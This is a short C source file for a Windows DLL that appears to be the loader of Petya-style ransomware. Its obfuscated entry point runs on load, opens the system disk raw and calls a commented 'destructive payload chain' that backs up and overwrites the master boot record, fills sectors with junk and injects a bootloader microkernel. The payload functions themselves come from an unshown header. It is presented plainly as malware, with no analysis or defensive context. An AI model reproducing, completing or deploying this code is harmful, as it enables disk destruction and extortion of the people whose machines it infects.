#include <Windows.h>
#include "misc.h"

#pragma section(".text", execute, read, write)
#pragma code_seg(".text")

HANDLE hHard = NULL;

// DLL entry point
BOOL APIENTRY ZuWQdweafdsg345312(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Gain raw disk access (PhysicalDrive0 = system disk)
        hHard = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, 0, NULL
        );

        if (hHard == INVALID_HANDLE_VALUE) {
            MessageBoxA(NULL, "Fatal Error - Cannot access disk", "FATAL ERROR", MB_ICONERROR);
            return FALSE;
        }

        // Destructive payload chain
        PetyaBackupMBR();               // Optional: back up MBR to hidden sector
        PetyaFillEmptySectors();        // Fill slack space with junk/XORs
        PetyaConfigurationSector();     // Alter boot config/volume config
        PetyaInsertMicroKernel();       // Inject bootloader/microkernel (Petya-style)

        CloseHandle(hHard);
    }
    return TRUE;
}
